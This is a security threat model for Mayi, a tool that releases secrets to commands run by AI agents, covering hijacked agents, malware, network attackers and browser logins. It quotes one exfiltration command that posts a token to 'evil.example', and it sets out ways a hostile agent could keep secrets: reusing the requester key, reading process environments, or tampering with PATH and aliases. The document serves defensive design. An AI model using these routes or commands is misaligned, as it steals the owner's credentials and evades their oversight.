# Threat model

What Mayi protects, from whom, and where it does not. Nothing here has been
independently audited.

## What is being protected

Secret values (API keys, tokens, passwords) that AI agents need in order to
run commands on the owner's behalf.

## Who is trusted

- **The owner**, at a vault device, deciding on prompts.
- **Vault devices** (the Mac app, the Android app): they hold the vault and
  the keys. All devices of a vault trust each other completely.
- **The command the owner approves.** Once a secret is released to a
  command, that command can do anything with it.

Agents are not given secret values: an agent names a secret and a command,
and the value goes to the command. That keeps values out of the model's
context and transcripts, puts every use behind your levels, and records it
in Activity. Mayi complements an agent sandbox rather than replacing it: an
agent that has been compromised and runs as you can get a value you let it
use (see "An agent that sets out to keep a value"), and keeping that value
from leaving is the sandbox's job. No push service or other third party is
involved: requests travel only between your machines and your devices.

## Threats and what happens

### A hijacked or misbehaving agent (the main case)

An agent that has been prompt-injected, or is simply wrong, asks for secrets
it should not use, or tries to exfiltrate one.

- It cannot read a secret directly. The only operation is "run this command
  with these secrets", and the value goes to the command, not to the agent.
- Each request shows the owner the exact command, shell-quoted so argument
  boundaries cannot be disguised. The reason, agent name and session are
  shown as claims, below the command.
- Levels decide how much the owner is involved: logged, notified with a Stop
  button, approval, or fingerprint. Rules can raise a level (a request from
  another machine, a command outside the secret's expected ones) and never
  lower it.
- Approvals are narrow by default: one use, or the same command in the same
  session, for a capped time.
- Prompts do not take keyboard focus and have no default button.
- Everything is logged with the command and the reason, without values.
- `mayi` looks the program up itself, leaving the working folder and
  temporary folders out of PATH, and runs it from the exact path it found.
  That path is what the prompt and Activity show (`/opt/homebrew/bin/gh pr
  list`), so a program the agent named `gh` in a folder of its own is shown
  for what it is. An expected command written by name (`gh *`) matches only
  a program found that way; one the agent gave by path matches only a
  pattern with its path.
- The command runs without the variables that make programs load or run
  other code (the dynamic loader's, `BASH_ENV`, `NODE_OPTIONS`,
  `PYTHONPATH`, git's command hooks and similar), as sudo does.

**Limits.** An approved command is the trust boundary. If the owner approves
`sh -c 'curl evil.example -d $TOKEN'`, the token is gone. Output masking
catches a value printed plainly or in base64 or hex, not one that is
deliberately transformed, and only in the command's own output: a command
that writes the value to a file leaves it there. A level 1 or 2 secret is
released to any command without asking, so those levels suit secrets whose
misuse is tolerable, or secrets with an expected-commands list. A plausible
lie in the reason field can mislead an owner who does not read the command.

### An agent that sets out to keep a value

Mayi guards against an agent that is wrong or careless; an agent working
against you, running as you, is what an agent sandbox is for. Such an agent
can get the value of any request you allow:

- **It can be its own requester.** Values go to the process that asked,
  which runs the command. An agent can use the requester key in
  `~/.config/mayi/requester.json`, or the Mac app's socket, ask to run
  something harmless, and keep the values. The command in the prompt is
  what `mayi` will run, but a device cannot tell that it is talking to
  `mayi`.
- **It can read the command's environment.** A process can read the
  environment of another process of the same user: through `/proc` on
  Linux, and on macOS for any program that is not part of the system.
- **It can change what an approved command does,** through a folder on PATH
  it can write to, the program's configuration (a `gh` alias that runs a
  shell), or the project files the command reads.

So approving gives the secret to that agent session; it does not control
what the session does with it. What holds: nothing is released without
passing your levels, every release is recorded, a level 4 secret needs your
fingerprint for each request, and at levels 2 to 4 you see each use as it
happens.

For an agent you cannot fully trust, use both: run it in a sandbox with a
network policy (Docker's agent sandboxes, OpenShell), so that what it holds
cannot go anywhere you did not allow, and keep the secrets that matter most
at level 4. Mayi decides which secrets reach the sandbox; the sandbox
decides where they can go.

### Leaks into the model's context, transcripts and logs

The value never appears in the agent's tool input or output: the agent sends
a name, and reads masked output. The audit log never contains values.

**Limits.** A command that prints its secret in an encoding the masker does
not know leaks it into the transcript.

### A compromised requester machine (a server or VM running agents)

- The machine stores no secrets, only its own identity key and where to find
  the vault devices.
- Stealing that key lets an attacker send requests as the machine. They pass
  through the same levels, are marked as coming from another machine, and
  level 1 secrets are raised to a notification.
- Revoking the machine stops it, and lists the secrets the revoking device
  released to it.

**Limits.** Whatever was released to commands on that machine was in its
memory, and must be considered exposed if the machine was compromised at the
time. A stolen identity key gets the level 1 and 2 secrets in the machine's
ACL with only a notification as warning.

### ACLs

Each paired machine, and the agents on each vault device's machine, may use
only the secrets in its ACL: whole tags, single secrets, or all of them.
Every device checks it before levels and before asking anyone, and lists
only what is allowed.

- ACLs guard against mistakes and over-reach: an agent on a CI machine that
  asks for a production key is refused outright, and a stolen machine key
  reaches only what that machine's ACL allows.
- They are records of the vault, synced like secrets, so whichever device
  answers enforces the same list.

**Limits.**

- An ACL says which machine may use a secret, not which agent or command on
  it. Any process on an allowed machine can ask for anything in its ACL, so a
  compromised agent there remains the sandbox's job.
- A tag covers secrets tagged later, so tagging a secret can let machines use
  it. The editor shows who could use the secret as the tags are typed, and
  the ACL editor shows how many secrets each tag covers.
- Like levels 1 to 3, ACLs are policy: malware on a vault device can change
  them.

### An attacker on the network

- Between machines and devices, and between devices, all traffic is inside a
  Noise tunnel (IK, X25519, ChaCha20-Poly1305). The caller always knows the
  callee's static key in advance, so it cannot be redirected to an impostor.
- Pairing and enrolment tokens carry a 256-bit one-time secret, so
  intercepting a pairing attempt gives nothing to guess.

**Limits.** Whoever obtains an unused token before the owner uses it can pair
their own machine or, worse, enrol their own device and receive the vault.
Tokens expire after 10 minutes, work once, and need the owner's fingerprint
to create, but they must still travel over a channel the owner trusts. The
listening port accepts connections from anyone who can reach it; an
unauthenticated peer can do nothing beyond a failed handshake, but there is
no rate limiting.

### Malware running as the owner on a vault device

This is where levels differ in kind.

- **Levels 1 to 3 are policy.** The vault key is wrapped to a Secure Enclave
  key, which answers to any process of the same user. The app keeps that
  key's blob sealed with a keychain item only Mayi can read, and uses the
  hardened runtime, so no program can load its code into Mayi to read it.
  Malware that gets past that (you allow its keychain dialog, or it replaces
  the app) can read every secret below level 4, forge approvals, and enrol
  its own machines. On Android the app sandbox does this work, but a
  compromised device is still a lost device.
- **Level 4 is cryptography.** Each level 4 secret's key is wrapped only to a
  hardware key that will not be used without the owner: on Android, a fresh
  biometric match; on a Mac, Touch ID, a paired Apple Watch, or the login
  password, so that a closed lid or a missing Touch ID keyboard does not
  block level 4. Malware cannot decrypt these without one of those.

**Limits.** Malware can wait for the owner to unlock a level 4 secret
legitimately and take it from the command's environment or from the short
window during which an unlock is cached (up to 5 minutes for the same command
and session; on Android the hardware key itself stays usable for 10 seconds
after a match). It can also show the owner a misleading prompt. Level 4
raises the cost; it does not make a compromised device safe. On a Mac,
anyone who knows the login password, malware that captured it included, can
unlock level 4 with it: accepting the password was chosen over a level 4
that a closed lid blocks. Macs set up before v0.1.0-alpha.3 keep a
fingerprint-only key until they set up their vault again.

Until Mayi is signed with an Apple Developer ID, macOS ties its keychain item
to the exact build: after each update it asks once for your password to let
the new Mayi read it (choose Always Allow). That trains you to allow a
dialog another program could also cause; check that it names Mayi, just
after you updated it.

### Someone at an unlocked device

The apps show a secret's values only after the owner confirms: Touch ID or
the login password on a Mac, a fingerprint on a phone. One confirmation
unlocks the app until the Mac locks or sleeps, or until the phone's screen
goes off or the app has been in the background for five minutes; while
unlocked, showing values, pairing a machine, adding a device and creating a
recovery key ask nothing more. Someone at an unlocked Mac with Mayi unlocked
can therefore read secrets below level 4 without a further check. A login's two-factor
key is never shown, only the code it gives now. For level 4 that
confirmation is the hardware unlock itself. Every view is written to the
activity log, without the value.

**Limits.** For levels 1 to 3 the confirmation is a policy check in the app,
like pairing, not cryptography. A copied value is readable by other apps
until it is cleared after a minute; it is marked so clipboard managers and
Android's clipboard preview skip it.

### Theft of a device, or of a copy of the vault file

- The file alone is useless: every value is sealed under keys that only a
  vault device's hardware, or the recovery key, can unwrap.
- A stolen, locked device needs its passcode or biometrics as usual; level 4
  additionally needs the owner: an enrolled fingerprint on a phone (adding
  one invalidates the key), or on a Mac Touch ID, a paired watch or the
  login password.
- Removing the device from the vault stops it syncing and receiving new
  level 4 secrets, and marks each secret it could read with a warning on
  every device until the value is replaced or the warning dismissed.
  Revoking a machine does the same for the secrets it was given.

**Limits.** Removal is not erasure. A removed device keeps what it already
had, and the vault key does not change, so the marked secrets must be
rotated at their source.

### The shared activity log

Every device holds the activity of all of them for 90 days: the commands,
websites, reasons and agent names, which machine asked and the outcome,
never a value. It is sealed under the vault key like the secrets, so it
travels only between the vault's devices. A device that is stolen and
unlocked therefore shows what was asked on the others too, and a removed
device keeps the activity it had. Entries are sealed, not signed: a device
of the vault could add entries in another device's name, though an entry a
device already holds is never replaced.

### Loss of every device

Each device knows which secrets exist only on it (one copy) and marks them,
so a secret added on one device and never synced is not lost unnoticed with
it.

The optional recovery key is an offline key that can open a copy of the vault
file with no device and no fingerprint. It exists so that changed
fingerprints, a dead Mac or a lost phone do not mean lost secrets.

**Limits.** It is the one thing that bypasses level 4. Anyone holding it and
a copy of the vault file reads everything. Replacing it stops the old key
from receiving new level 4 secrets, but the old key still opens the vault key
and therefore every secret below level 4, old and new.

### A phone that listens

A phone keeps its port open while it sleeps, so anyone on the same network or
tailnet can connect to it. Without a paired machine's key or a device's key
the handshake fails and nothing is learnt; each connection wakes the phone
for up to 30 seconds, which costs a little battery.

### Agents on a vault device's machine

`mayi` on a Mac with the app pairs that Mac with the vault through the app's
local socket, without asking, so agents there can also reach the phone. Any
process of the user can already make requests through that socket. The new
part is a key file in `~/.config/mayi/requester.json` that also works from
elsewhere on the network: a process that copies it can send requests to the
other devices from another machine. Those requests are remote, so they are
at least level 2 (the owner is notified and can stop them) and show the
pairing's name. Turning off "Agents on this Mac can also ask your other
devices" revokes it.

### Waiting for a device

A request can wait up to an hour for a device to come online. The reason it
gives may be stale by then; it is shown as the agent stated it, like any
claim, together with the time the prompt appeared.

### Website logins

`mayi fill` types a login into the page open in the agent's own browser,
reached through the browser's debugging port on the same machine.

What holds:

- The password and the two-factor key never appear in the agent's tool
  input or output, in transcripts, or in the audit log. `mayi fill` prints
  only which fields it typed.
- The two-factor key never leaves vault devices. The page gets the current
  code, which expires within a minute.
- A login is typed only into a page whose origin, read from the browser,
  matches one of its websites, over https. A page on another host, a
  look-alike domain or another port gets a refusal without a prompt.
- A login can never be given to a command, so it cannot be put in an
  environment variable and printed. Its values are bound to that kind by
  encryption: relabelling it as an ordinary secret makes it unreadable.
- The password goes only into a password field of the page's main frame.
  Pages with two password fields (sign-up, password change) are refused, so
  a filled-in current password cannot be used to set a new one.
- The password does not stay in the page. Some browser tools read field
  values into the model's context (Playwright's accessibility snapshots
  do), so after submitting, Mayi waits for the page to move on and, if it
  has not within five seconds, empties the field itself.
- Each sign-in is logged, notified, approved or fingerprinted according to
  its level, with the website shown where a command would be.

**Limits.**

- **The browser is the agent's.** An agent that can run scripts in the page
  (most browser tools can) can capture the password as it is typed, or read
  it from the field before it is cleared. A hijacked agent could also point
  `mayi fill` at a browser that lies about the page's address. The rules
  above narrow this; they are not a boundary. Closing it needs a browser
  the vault side controls, or passkeys, both of which this design leaves
  room for.
- **The session is the grant.** Once signed in, the agent can do whatever
  you can on that site. Approval controls the sign-in, not what follows.
- The username and a typed two-factor code are visible on the page, and so
  to the agent.
- The website in a prompt is what the requester's browser reported, like
  the command of a `run`.
- Keeping a site's two-factor key next to its password makes the vault the
  one thing that protects both. Level 4 keeps both behind your confirmation.
- The debugging port lets any program running as you on that machine drive
  the browser. `mayi browser` gives the agent a separate profile, so your
  everyday sessions are not in it.

### AWS sign-ins

An AWS IAM Identity Center sign-in is held by vault devices. A request names
one of its profiles (an account and a role); the vault device fetches that
role's temporary credentials from AWS and releases only those.

What holds:

- **The session never leaves vault devices.** Its access and refresh tokens
  can fetch credentials for every role the owner has, so nothing returns
  them: not `mayi`, not the apps (even to the owner), not the audit log. A
  request for a field other than a profile's credentials is refused.
- **Each profile has its own level, and approvals do not cross profiles.**
  A grant is kept per profile and level, so approving a read-only role for
  a session never covers an admin role, and raising a level drops what was
  granted under the old one.
- **Only configured profiles are released.** A role the owner did not add is
  refused before anyone is asked.
- **Loosening needs the owner's finger.** Adding a profile or lowering one's
  level asks for Touch ID (or the phone's fingerprint), through the same
  hardware key as level 4, even in a window left unlocked. So does lowering
  any secret's level, adding expected commands or websites, or lengthening
  its grants. An agent driving the screen cannot do it alone.
- **AWS's own sign-in stays the strong step.** Signing in happens in the
  owner's browser, with their identity provider and two-factor; AWS names
  the app asking ("Mayi"). The vault device refreshes the session silently,
  as the AWS CLI does, until AWS ends it (8 hours by default).
- **The AWS CLI's plain-file copies are removed.** `~/.aws/sso/cache` holds
  the same kind of session in a file any program can read. Mayi removes the
  copies for portals it holds, and flags one that comes back.

**Limits.**

- **Level 4 on a profile is a check, not encryption.** The session is shared
  by every role, so it is stored like a level 1 to 3 secret; a profile at
  level 4 asks for the fingerprint, through the hardware key, before its
  credentials are fetched. Malware past Mayi's own protections on a vault
  device (see "Malware running as the owner on a vault device") can use the
  session for any role, as it could read any level 1 to 3 secret. Real
  separation between roles needs separate AWS identities: Mayi holds each as
  its own sign-in.
- **Released credentials live as long as AWS says.** A command given a
  role's credentials, or an agent reading that command's environment, can
  keep them until they expire: 1 to 12 hours, the permission set's session
  length. Mayi cannot shorten or revoke them. A proxy that signs requests
  without handing out credentials is planned (`docs/providers.md`).
- **The agent can still ask AWS itself.** An agent that runs `aws sso login`
  opens AWS's approval page in the owner's browser; if the owner allows it,
  the AWS CLI's file copy is back. Mayi flags the file, and the page names
  the app asking; allow only "Mayi".
- **`credential_process` hands credentials to the AWS tool.** With the AWS
  CLI profiles Mayi writes, `aws configure export-credentials` prints a
  profile's credentials, without the masking `mayi run` applies. For level 1
  and 2 profiles that happens without asking; the owner sees the command in
  Activity, and in the prompt for levels 3 and 4.
- **Refresh tokens and several devices.** Each vault device refreshes the
  session on its own. If AWS replaces the refresh token, the device keeps
  the new one and syncs it; two devices refreshing at the same moment can
  leave one of them asking the owner to sign in again.

## Things Mayi does not try to do

- Sandbox the commands it releases secrets to, or restrict where they send
  data.
- Protect against the model provider seeing what the agent sees: it sees the
  command and the masked output, as it would anyway.
- Rotate secrets at their source. It tells you which ones to rotate.
- Hide which secrets exist from a paired machine: `mayi list` returns names.

## Known gaps

- The cryptography uses standard, widely used primitives and the Noise
  framework through the `snow` library, but the composition is unaudited.
- The vault key is never rotated, which is why removing a device or
  replacing the recovery key cannot revoke access to what they already held.
- Mayi is not yet signed with an Apple Developer ID: macOS shows it as from
  an unidentified developer, and each update asks for the keychain password
  once.
